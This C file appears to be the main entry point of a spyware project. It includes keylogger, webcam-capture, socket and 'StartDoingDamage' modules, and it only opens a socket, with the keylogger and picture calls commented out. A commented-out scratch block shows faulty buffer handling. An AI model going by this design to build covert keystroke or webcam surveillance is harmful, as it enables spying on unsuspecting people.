#include "utilities.h"
#include "KeyLogger.h"
#include "TakePicture.h"
#include "escapi.h"
#include "Socket.h"
#include "StartDoingDamage.h"


int main()
{
	/*
	char* sports[5] = {
						 "golf",
						 "hockey",
						 "football",
						 "cricket",
						 "shooting"
	};

	char** buffer = (char**) malloc(5 * sizeof(char*));

	printf("sizeof(int*) = %d \n", sizeof(int*));
	printf("sizeof(char*) = %d \n", sizeof(char*));
	printf("sizeof(sports) = %d \n", sizeof(sports));

	for (int i = 0; i <= sizeof(buffer) + 1; i++)
	{
		printf("sizeof(buffer[%d]) = %d \n",i, sizeof(buffer[i]));
		strncpy(&buffer[i], "hello", sizeof("hello"));
		if (i == 3)
		{
			strncpy(&buffer[i], "three", sizeof("three"));
		}
		printf("buffer = %s \n", &buffer[i]);
	}


	getchar();*/
	if (start_socket() != 0)
	{
		printf("Problem in Socket function! \n");
		return -1;
	}

	/*if (TakePicture() != 0)
	{
		printf("Problem taking picture! \n");
		return -1;
	}*/

	/*if (key_logger() != 0)
	{
		printf("Problem in key_logger function! \n");
		return -1;
	}*/

	
	

	return 0;
}